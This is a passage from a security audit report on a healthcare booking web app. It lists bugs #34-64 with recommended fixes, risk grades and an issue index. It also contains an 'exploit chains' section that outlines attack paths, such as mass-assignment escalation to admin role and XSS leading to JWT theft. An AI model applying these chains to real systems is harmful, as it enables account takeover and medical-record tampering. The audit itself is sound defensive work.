  const basePricePaise = Math.round(basePrice * 100);
  const platformFeePaise = Math.round(basePricePaise * 0.15);
  const gstPaise = Math.round((basePricePaise + platformFeePaise) * 0.18);
  ```

---

### Bug #34: Swagger UI Exposed Without Authentication

- **Category:** Security Bug - Information Disclosure
- **File / Location:** [app.js:280-283](app.js#L280-L283)
- **Description:** Swagger documentation publicly accessible at `/api-docs` with no authentication. Exposes all API endpoints, parameters, and formats.
- **Root Cause:** No auth middleware on the Swagger route.
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  if (process.env.NODE_ENV !== 'production') {
    app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));
  }
  ```

---

### Bug #35: `xss-clean` Package is Deprecated and Unmaintained

- **Category:** Compatibility Bug - Insecure Dependency
- **File / Location:** [package.json:111](package.json#L111)
- **Description:** `xss-clean@0.1.4` is deprecated since 2019 with known bypass vectors.
- **Root Cause:** Using a deprecated security dependency.
- **Impact:** **Medium** - False sense of XSS protection.
- **Recommended Fix:** Remove `xss-clean` and rely on the existing `sanitizationMiddleware`.

---

### Bug #36: `moment.js` is in Maintenance Mode - Large Bundle

- **Category:** Performance Bug - Bundle Size
- **File / Location:** [package.json:99](package.json#L99)
- **Description:** `moment@2.30.1` adds ~300KB to the server bundle. Maintenance mode, not actively developed.
- **Impact:** **Medium** - Increased memory usage and startup time.
- **Recommended Fix:** Replace with `dayjs` (2KB, same API).

---

### Bug #37: Error Object Thrown as Plain Object (Not Proper Error Instance)

- **Category:** Design Bug - Error Handling Anti-Pattern
- **File / Location:** Multiple: [services/authService.js:26-29](services/authService.js#L26-L29), [services/paymentService.js:37-40](services/paymentService.js#L37-L40), etc.
- **Description:** Services throw plain objects `throw { statusCode: 400, message: '...' }` instead of proper Error instances. No stack trace, not caught by Sentry.
- **Root Cause:** Inconsistent pattern - codebase has both custom Error classes and plain object throws.
- **Impact:** **Medium**
- **Recommended Fix:** Use existing custom error classes consistently: `throw new ValidationError(message)`.

---

### Bug #38: Missing `next` Parameter Usage in Payment Controllers

- **Category:** Design Bug - Express Pattern Violation
- **File / Location:** [controllers/paymentController.js](controllers/paymentController.js) (all methods)
- **Description:** All methods accept `next` but never call it for unhandled errors, bypassing the global error handler.
- **Impact:** **Medium** - Error monitoring middleware won't see payment errors.

---

### Bug #39: Service Worker May Cache Sensitive API Responses

- **Category:** Security Bug - Cache Poisoning
- **File / Location:** [client/public/service-worker.js:33-58](client/public/service-worker.js#L33-L58)
- **Description:** API responses cached for 5 minutes including health data and payment info. Sensitive data persists in browser cache even after logout.
- **Root Cause:** Overly broad caching strategy without excluding sensitive routes.
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  self.addEventListener('fetch', (event) => {
    if (event.request.url.includes('/api/')) return; // Never cache API responses
  });
  ```

---

### Bug #40: Image Dimension Validation is Ineffective

- **Category:** Behavioral Bug - Incomplete Validation
- **File / Location:** [middleware/uploadEnhanced.js:120-138](middleware/uploadEnhanced.js#L120-L138)
- **Description:** `validateImageDimensions` compares `buffer.length` vs `stats.size` but since `readFile` loads the entire file, they're always equal. The zip bomb check can never trigger.
- **Root Cause:** Misunderstanding of `readFile` behavior.
- **Impact:** **Medium** - No actual zip bomb protection despite code claiming it.
- **Recommended Fix:** Use `sharp` library for actual dimension validation.

---

### Bug #41: Cross-Origin-Embedder-Policy Breaks External Resources

- **Category:** Compatibility Bug - COEP Misconfiguration
- **File / Location:** [middleware/security.js:348](middleware/security.js#L348)
- **Description:** `Cross-Origin-Embedder-Policy: require-corp` blocks external resources (Razorpay, Google Fonts, CDN scripts) that don't include CORP headers.
- **Root Cause:** Overly strict COEP.
- **Impact:** **Medium** - Razorpay checkout and CDN scripts may fail to load.
- **Recommended Fix:** `res.setHeader('Cross-Origin-Embedder-Policy', 'credentialless');`

---

### Bug #42: Email Regex Rejects Valid Email Addresses

- **Category:** Validation Bug - Overly Restrictive
- **File / Location:** [models/user.js:18](models/user.js#L18)
- **Description:** Regex `/^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/` rejects TLDs longer than 4 chars and emails with `+` signs.
- **Impact:** **Medium**
- **Recommended Fix:** `match: [/^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'Please provide a valid email']`

---

### Bug #43: Booking `totalSpent` Never Decremented on Refund

- **Category:** Logic Error - Data Integrity
- **File / Location:** [services/bookingService.js:544-548](services/bookingService.js#L544-L548)
- **Description:** Patient's `totalSpent` is incremented on booking completion but never decremented if a refund is later processed.
- **Impact:** **Medium** - Patient analytics show inflated spending.

---

### Bug #44: Missing basePrice Positive Validation

- **Category:** Logic Error - Financial Bug
- **File / Location:** [services/bookingService.js:86-92](services/bookingService.js#L86-L92)
- **Description:** No validation that `basePrice` is a positive number. If `service.pricing.basePrice` is `0`, `null`, or negative, a zero-cost or negative-cost booking can be created.
- **Root Cause:** Missing value validation after price lookup.
- **Impact:** **Medium** - Could create free or negative-priced bookings.
- **Recommended Fix:**
  ```javascript
  if (!basePrice || basePrice <= 0) {
    throw new ValidationError('Invalid service pricing configuration');
  }
  ```

---

### Bug #45: N+1 Query in Doctor Access Service

- **Category:** Performance Bug - Inefficient Query
- **File / Location:** [services/doctorAccessService.js:100-108](services/doctorAccessService.js#L100-L108)
- **Description:** First query fetches ALL hospital providers, then second query checks if patient has a booking with ANY of them. For hospitals with thousands of providers, this is very slow.
- **Root Cause:** Two separate queries instead of aggregation pipeline.
- **Impact:** **Medium**
- **Recommended Fix:** Use a single aggregation pipeline with `$lookup`.

---

### Bug #46: Fire-and-Forget AI Analysis with No Timeout

- **Category:** Resource Bug - Promise Accumulation
- **File / Location:** [services/investigationReportService.js:85-108](services/investigationReportService.js#L85-L108)
- **Description:** `triggerAIAnalysis(report._id).catch(...)` is fire-and-forget with no timeout. If the Gemini API hangs, promises accumulate indefinitely, consuming memory.
- **Root Cause:** Uncontrolled async task without timeout or queue.
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  Promise.race([
    triggerAIAnalysis(report._id),
    new Promise((_, reject) => setTimeout(() => reject(new Error('AI analysis timeout')), 60000))
  ]).catch(err => { /* update status to AI_FAILED */ });
  ```

---

### Bug #47: Race Condition in Patient Address Management

- **Category:** Concurrency Bug - Race Condition
- **File / Location:** [services/patientService.js:237-241](services/patientService.js#L237-L241)
- **Description:** Setting a default address uses two DB operations: first unsets all defaults, then pushes new address. Two concurrent requests can both see no default and both set theirs.
- **Root Cause:** Non-atomic update pattern.
- **Impact:** **Medium**
- **Recommended Fix:** Use atomic `findOneAndUpdate` with array filtering in a single operation.

---

### Bug #48: Missing Date Validation in Booking Filters

- **Category:** Input Validation Bug
- **File / Location:** [controllers/bookingController.js:59-66](controllers/bookingController.js#L59-L66)
- **Description:** `startDate` and `endDate` query parameters are passed directly to `new Date()` without format validation. Invalid dates like `"abc"` become `Invalid Date` and cause query issues.
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  if (startDate) {
    const parsed = new Date(startDate);
    if (isNaN(parsed.getTime())) {
      return res.status(400).json({ success: false, message: 'Invalid startDate format' });
    }
    filters.scheduledDate.$gte = parsed;
  }
  ```

---

### Bug #49: Sensitive Data Logged Without Sanitization

- **Category:** Security Bug - Information Disclosure
- **File / Location:** [utils/logger.js:119-129](utils/logger.js#L119-L129)
- **Description:** `logger.logRequest` logs `req.originalUrl` which may contain sensitive query parameters (tokens, patient IDs, search queries).
- **Root Cause:** No URL sanitization before logging.
- **Impact:** **Medium** - Sensitive data persists in log files accessible to anyone with log access.
- **Recommended Fix:** Strip sensitive query params before logging:
  ```javascript
  const sanitizeUrl = (url) => url.replace(/token=[^&]+/gi, 'token=***');
  ```

---

### Bug #50: No Token Revocation / Blacklist Mechanism

- **Category:** Security Design Gap
- **File / Location:** [middleware/auth.js](middleware/auth.js), [middleware/patientAuth.js](middleware/patientAuth.js)
- **Description:** There is no mechanism to invalidate a JWT token before its expiry (7 days). If a token is compromised, it remains valid for the full duration. Logout only clears client-side storage.
- **Root Cause:** Stateless JWT design without server-side revocation.
- **Impact:** **Medium** - Stolen tokens are valid for up to 7 days with no way to revoke.
- **Recommended Fix:** Implement Redis-based token blacklist:
  ```javascript
  // On logout
  await redis.setex(`blacklist:${token}`, JWT_EXPIRE_SECONDS, 'true');
  // In auth middleware
  const isBlacklisted = await redis.get(`blacklist:${token}`);
  if (isBlacklisted) return res.status(401).json({ message: 'Token revoked' });
  ```

---

### Bug #51: Redis Password Not Required When REDIS_ENABLED=true

- **Category:** Security Bug - Insecure Configuration
- **File / Location:** [config/redis.js:14-15](config/redis.js#L14-L15), [config/validateEnv.js:113-117](config/validateEnv.js#L113-L117)
- **Description:** When `REDIS_ENABLED=true`, the validation only warns if `REDIS_PASSWORD` is missing, but doesn't error. An unauthenticated Redis instance is accessible to anyone on the network.
- **Root Cause:** Validation is permissive instead of strict for security-critical configuration.
- **Impact:** **Medium**
- **Recommended Fix:** Change validation from warning to error when `REDIS_ENABLED=true` and `REDIS_PASSWORD` is empty in production.

---

### Bug #52: Rate Limit Degradation on Redis Failure

- **Category:** Security Bug - Defense Degradation
- **File / Location:** [config/rateLimit.js:277-280](config/rateLimit.js#L277-L280)
- **Description:** When Redis health check fails in multi-instance deployments, rate limits are divided by instance count. This silently weakens protection without alerting operations.
- **Root Cause:** Graceful degradation prioritized over security.
- **Impact:** **Medium** - Multi-instance bypass: 5 instances each get 1/5th of the limit, but attackers can hit all 5 instances.
- **Recommended Fix:** Alert/escalate on Redis failure. Fall back to stricter per-instance limits, not divided limits.

---

### Bug #53: Unvalidated File URLs in User Model

- **Category:** Security Bug - Stored XSS Vector
- **File / Location:** [models/user.js:43-46](models/user.js#L43-L46)
- **Description:** The `profilePhoto.url` field accepts any string. An attacker could store a `javascript:` or `data:` URI that executes when rendered in an `<img>` or `<a>` tag.
- **Root Cause:** Missing URL validation on document URL fields.
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  profilePhoto: {
    url: {
      type: String,
      validate: {
        validator: (v) => !v || /^https?:\/\//.test(v),
        message: 'Profile photo URL must be a valid HTTP(S) URL'
      }
    }
  }
  ```

---

### Bug #54: Password Reset Token Format Too Permissive

- **Category:** Security Bug - Weak Validation
- **File / Location:** [validators/authValidator.js:155-158](validators/authValidator.js#L155-L158)
- **Description:** Reset token validation only checks length (10-500 chars). This is overly permissive and doesn't validate format, potentially allowing brute-force of predictable tokens.
- **Root Cause:** Weak token format validation.
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  param('token')
    .notEmpty().withMessage('Reset token is required')
    .matches(/^[a-f0-9]{64}$/).withMessage('Invalid token format'),
  ```

---

### Bug #55: Patient Model Password Minimum Length Mismatch

- **Category:** Validation Bug - Inconsistent Rules
- **File / Location:** [models/patient.js:24-28](models/patient.js#L24-L28)
- **Description:** Patient schema requires `minlength: 6` for password, but the auth validator requires 8 characters. If passwords are set via direct model operations (e.g., admin scripts, seed data), the weaker 6-char limit applies.
- **Root Cause:** Schema and validator have different minimum lengths.
- **Impact:** **Medium**
- **Recommended Fix:** Update patient schema to `minlength: [8, 'Password must be at least 8 characters']`.

---

### Bug #56: No Soft Delete on Healthcare Models

- **Category:** Compliance Bug - Missing Audit Trail
- **File / Location:** Multiple models: user.js, patient.js, healthRecord.js
- **Description:** Models lack `isDeleted`/`deletedAt` fields. Hard deletes permanently remove data, breaking audit trails required for healthcare compliance (HIPAA/DISHA).
- **Root Cause:** No soft delete implementation.
- **Impact:** **Medium** - Deleted data cannot be recovered for audit, legal, or compliance purposes.
- **Recommended Fix:** Add soft delete fields and implement archiving:
  ```javascript
  isDeleted: { type: Boolean, default: false },
  deletedAt: Date,
  deletedBy: { type: mongoose.Schema.Types.ObjectId }
  ```

---

## Low Priority Issues (P3)

---

### Bug #57: Console.error Used Instead of Logger in Error Handler

- **Category:** Code Quality - Inconsistent Logging
- **File / Location:** [middleware/errorHandler.js:2](middleware/errorHandler.js#L2)
- **Description:** Global error handler uses `console.error(err)` bypassing Winston logger, log formatting, and log aggregation.
- **Impact:** **Low**

---

### Bug #58: Unused `crypto-js` Dependency

- **Category:** Code Quality - Dead Dependency
- **File / Location:** [package.json:86](package.json#L86)
- **Description:** `crypto-js` is listed but unused - the codebase uses Node's built-in `crypto` module.
- **Impact:** **Low** - Unnecessary attack surface.
- **Recommended Fix:** `npm uninstall crypto-js`

---

### Bug #59: `geoip-lite` Potentially Unused (~60MB Memory)

- **Category:** Code Quality - Potentially Dead Dependency
- **File / Location:** [package.json:95](package.json#L95)
- **Description:** `geoip-lite` bundles a ~60MB database loaded into memory on require.
- **Impact:** **Low** - ~60MB unnecessary memory usage if not actively used.

---

### Bug #60: Missing Request Timeout for External API Calls

- **Category:** Performance Bug - Resource Exhaustion
- **File / Location:** [services/paymentService.js](services/paymentService.js) (multiple Razorpay calls)
- **Description:** Razorpay API calls don't specify timeouts. If the Razorpay API hangs, requests wait indefinitely.
- **Impact:** **Low** (normal conditions) - But under Razorpay outages, requests accumulate and exhaust server resources.

---

### Bug #61: Inconsistent User ID Field Naming

- **Category:** Code Quality - Naming Inconsistency
- **File / Location:** Multiple files
- **Description:** User ID accessed as `req.user.id` in some places, `req.user._id` in others. Fragile if user object is ever serialized without Mongoose virtuals.
- **Impact:** **Low**

---

### Bug #62: No Account Lockout After Failed Login Attempts

- **Category:** Security Bug - Brute Force Protection Gap
- **File / Location:** [services/authService.js:83-115](services/authService.js#L83-L115)
- **Description:** Rate limiting is IP-based only, not account-based. Distributed attacks bypass IP-based rate limiting.
- **Impact:** **Low** - Mitigated by rate limiter, but distributed brute-force still possible.
- **Recommended Fix:** Add `failedLoginAttempts` counter to User model, lock after 5 failures, auto-unlock after 15 minutes.

---

### Bug #63: Notification Polling Interval Never Cleared (Memory Leak)

- **Category:** Resource Bug - Memory Leak
- **File / Location:** [client/public/js/notification-center.js:472](client/public/js/notification-center.js#L472)
- **Description:** `setInterval` for 30-second notification polling is never cleared when the notification center is destroyed or user navigates away.
- **Impact:** **Low** - Memory leak in long-running browser sessions. Multiple intervals stack if component is re-initialized.

---

### Bug #64: Swagger Hardcodes Production URL

- **Category:** Configuration Bug
- **File / Location:** [config/swagger.js:19-27](config/swagger.js#L19-L27)
- **Description:** Swagger spec hardcodes `https://api.nocturnal.com` as production server URL, which may not match actual deployment.
- **Impact:** **Low** - Confusing for developers using Swagger docs.
- **Recommended Fix:** Use `APP_URL` from environment variables dynamically.

---

## Dangerous Exploit Chains

These are multi-bug attack paths where combining vulnerabilities creates a much larger impact:

### Chain 1: Full Account Takeover (Bugs #5 + #6)
```
XSS in innerHTML (Bug #5) --> Steal JWT from localStorage (Bug #6) --> Impersonate any user
```
**Impact:** Any user's account can be fully compromised through stored XSS.

### Chain 2: Admin Escalation (Bug #2)
```
Login as any user --> PUT /api/v1/auth/me { "role": "admin" } (Bug #2) --> Full system access
```
**Impact:** Instant admin privilege with a single API call.

### Chain 3: Payment Sabotage (Bug #3)
```
Login as Patient A --> POST /payments/failure with Patient B's bookingId (Bug #3) --> Disrupt bookings
```
**Impact:** Any patient can sabotage any other patient's payment flow.

### Chain 4: Medical Record Tampering (Bugs #8 + #25)
```
XSS via notification (Bug #25) --> Steal doctor's token (Bug #6) --> Write notes to any patient (Bug #8)
```
**Impact:** Forged medical records on any patient file.

### Chain 5: Cross-Hospital Data Manipulation (Bug #23)
```
Login as Hospital A admin --> Modify/delete Hospital B duties (Bug #23) --> Disrupt competitor operations
```
**Impact:** Cross-organizational sabotage.

---

## Overall Risk Assessment

### Summary

| Area | Grade | Notes |
|------|-------|-------|
| **Authentication** | B+ | JWT solid, but algorithm restriction missing, no revocation |
| **Authorization** | D+ | **Critical mass assignment, missing hospital scope, doctor note access gap** |
| **Payment Security** | B- | Good Razorpay verification, but missing refund route, auth gap, rollback issue |
| **Data Encryption** | C | CBC without authentication is a known weakness |
| **Input Validation** | C+ | Good on booking routes, but messaging has zero validation |
| **Client-Side Security** | D | XSS via innerHTML, tokens in localStorage, open redirect |
| **Error Handling** | B- | Mix of custom errors and plain objects, some info leakage |
| **Performance** | B | Good pagination/caching/compression. Sync I/O in uploads, N+1 queries |
| **Database** | B | Good indexing, reconnection logic (but with listener leak) |
| **Compliance** | C- | Missing soft delete, incomplete audit trails, HIPAA gaps |
| **Infrastructure** | B | Docker, PM2, monitoring in place. Redis config gaps |

### Most Critical Issues to Fix First (Priority Order)

1. **Bug #2** - Mass Assignment / Role Escalation (immediate exploit, single API call)
2. **Bug #8** - Doctor can write notes to any patient (medical data integrity)
3. **Bug #5 + #6** - XSS + localStorage Token = Full Account Takeover
4. **Bug #3** - Payment Failure Missing Auth Check (financial sabotage)
5. **Bug #9** - Messaging with zero input validation (injection vectors)
6. **Bug #1** - Hardcoded Secrets (rotate before production)
7. **Bug #7** - Encryption upgrade (CBC to GCM)
8. **Bug #4** - Refund Route missing (business-critical feature)
9. **Bug #16** - Rating field mismatch (all ratings broken)
10. **Bug #23** - Cross-hospital duty manipulation

### General Code Quality & Architecture Feedback

**Strengths:**
- Well-structured service layer pattern (Controller -> Service -> Model)
- Comprehensive rate limiting with endpoint-specific tiers
- Good security headers via Helmet with CSP
- NoSQL injection sanitization middleware
- Atomic operations for payment and booking state transitions
- Good logging infrastructure with Winston
- Test coverage infrastructure in place
- Health data access control system with tokens

**Areas for Improvement:**
- Authorization is the weakest layer - field whitelisting, hospital scoping, and access verification missing
- Client-side code needs a complete security overhaul (XSS prevention, token storage)
- Inconsistent error handling patterns (custom Error classes vs plain objects)
- Missing HIPAA-grade audit trails on health data access
- Some defense-in-depth gaps (algorithm pinning, URL validation, token revocation)
- Mixed sync/async filesystem operations in upload flow

---

## Preventive Recommendations

### Immediate Actions (This Week)
1. **Add field whitelists** to ALL update endpoints - never pass raw `req.body` to updates
2. **Add input validation** to messaging routes using express-validator
3. **Run `npm audit`** and fix vulnerable dependencies
4. **Rotate all secrets** in `.env` file

### Testing (Next 2 Weeks)
1. **Add authorization edge-case tests** for mass assignment, cross-hospital access, IDOR
2. **Add payment flow integration tests** covering create -> verify -> refund lifecycle
3. **Add XSS detection tests** for all innerHTML usage
4. **Add security-focused tests** for privilege escalation vectors

### CI/CD (Next Month)
1. **Pre-commit hook** running `eslint --rule 'no-eval: error'` and security checks
2. **Dependency scanning** with `npm audit` or Snyk in CI
3. **SAST scanning** for hardcoded secrets (e.g., `gitleaks`, `trufflehog`)
4. **Automated OWASP ZAP** scan on staging deployments

### Monitoring (Ongoing)
1. **Track failed auth attempts** per account (not just per IP)
2. **Alert on unusual payment patterns** (multiple failures, rapid refund requests)
3. **Monitor error rates** by endpoint to detect exploitation attempts
4. **Log all health data access** attempts (success and failure) for HIPAA compliance

---

## Master Issue Index

| Bug # | Title | Severity | Category | File |
|-------|-------|----------|----------|------|
| 1 | Hardcoded JWT Secret in .env | Critical | Security | .env |
| 2 | Profile Update Mass Assignment | Critical | Security | services/authService.js |
| 3 | Payment Failure Missing Auth | Critical | Security | services/paymentService.js |
| 4 | Refund Route Not Exposed | Critical | Functional | routes/payment.js |
| 5 | XSS via innerHTML | Critical | Security | client/public/app.js |
| 6 | JWT in localStorage | Critical | Security | client/public/js/auth.js |
| 7 | AES-CBC Without Auth Tag | Critical | Security | utils/encryption.js |
| 8 | Doctor Notes Without Access Check | Critical | Security | controllers/doctorAccessController.js |
| 9 | Messaging Zero Validation | Critical | Security | routes/messaging.js |
| 10 | False Positive Request Blocking | High | Behavioral | middleware/security.js |
| 11 | DB Reconnect Listener Buildup | High | Resource | config/database.js |
| 12 | Health Check Interval Leak | High | Resource | config/database.js |
| 13 | Duplicate Payment Routes | High | Integration | routes/payment.js, routes/payments.js |
| 14 | CORS Null Origin Bypass | High | Security | middleware/security.js |
| 15 | Blood Pressure NaN Corruption | High | Runtime | services/bookingService.js |
| 16 | Rating Updated Wrong Field | High | Logic | services/bookingService.js |
| 17 | Sync fs in Upload Quota | High | Performance | middleware/uploadEnhanced.js |
| 18 | Error Handler Info Leakage | High | Security | middleware/errorHandler.js |
| 19 | JWT No Algorithm Restriction | High | Security | middleware/auth.js |
| 20 | Rating Race Condition | High | Concurrency | services/bookingService.js |
| 21 | Express 5 Compatibility | High | Compatibility | package.json |
| 22 | Emergency QR Brute-Force | High | Security | routes/doctorAccess.js |
| 23 | Cross-Hospital Duty Access | High | Security | routes/duties.js |
| 24 | Refund Rollback Swallowed | High | Data Integrity | services/paymentService.js |
| 25 | XSS in Notification Center | High | Security | client/public/js/notification-center.js |
| 26 | Open Redirect via actionUrl | High | Security | client/public/js/notification-center.js |
| 27 | Health Token Audit Gap | High | Compliance | models/healthAccessToken.js |
| 28 | Non-Atomic Booking Completion | High | Data Integrity | services/bookingService.js |
| 29 | Path Traversal Incomplete Fix | Medium | Security | app.js |
| 30 | No Pagination Limit Cap | Medium | Performance | controllers/healthDataController.js |
| 31 | Unsanitized Booking Stats Filters | Medium | Security | services/bookingService.js |
| 32 | Missing await on Metrics Update | Medium | Logic | config/database.js |
| 33 | Floating Point Pricing | Medium | Logic | services/bookingService.js |
| 34 | Swagger Exposed No Auth | Medium | Security | app.js |
| 35 | xss-clean Deprecated | Medium | Compatibility | package.json |
| 36 | moment.js Bundle Size | Medium | Performance | package.json |
| 37 | Plain Object Error Throws | Medium | Design | Multiple services |
| 38 | Unused next in Controllers | Medium | Design | controllers/paymentController.js |
| 39 | Service Worker Caches API | Medium | Security | client/public/service-worker.js |
| 40 | Image Validation Ineffective | Medium | Behavioral | middleware/uploadEnhanced.js |
| 41 | COEP Breaks External Resources | Medium | Compatibility | middleware/security.js |
| 42 | Email Regex Too Restrictive | Medium | Validation | models/user.js |
| 43 | totalSpent Not Decremented | Medium | Logic | services/bookingService.js |
| 44 | Missing basePrice Validation | Medium | Logic | services/bookingService.js |
| 45 | N+1 Query Doctor Access | Medium | Performance | services/doctorAccessService.js |
| 46 | AI Analysis No Timeout | Medium | Resource | services/investigationReportService.js |
| 47 | Address Race Condition | Medium | Concurrency | services/patientService.js |
| 48 | Missing Date Validation | Medium | Validation | controllers/bookingController.js |
| 49 | Sensitive Data in Logs | Medium | Security | utils/logger.js |
| 50 | No Token Revocation | Medium | Security | middleware/auth.js |
| 51 | Redis Password Not Required | Medium | Security | config/redis.js |
| 52 | Rate Limit Degradation | Medium | Security | config/rateLimit.js |
| 53 | Unvalidated File URLs | Medium | Security | models/user.js |
| 54 | Reset Token Too Permissive | Medium | Security | validators/authValidator.js |
| 55 | Patient Password Length Mismatch | Medium | Validation | models/patient.js |
| 56 | No Soft Delete on Models | Medium | Compliance | Multiple models |
| 57 | console.error in Error Handler | Low | Quality | middleware/errorHandler.js |
| 58 | Unused crypto-js Dependency | Low | Quality | package.json |
| 59 | geoip-lite Potentially Unused | Low | Quality | package.json |
| 60 | No Timeout on Razorpay Calls | Low | Performance | services/paymentService.js |
| 61 | Inconsistent ID Field Naming | Low | Quality | Multiple files |
| 62 | No Account Lockout | Low | Security | services/authService.js |
| 63 | Notification Polling Leak | Low | Resource | client/public/js/notification-center.js |
| 64 | Swagger Hardcoded Prod URL | Low | Configuration | config/swagger.js |

---

*Report generated by 5 parallel analysis agents + manual code review. All findings should be verified by the development team before applying fixes. Some issues may be mitigated by runtime conditions not visible in static analysis.*
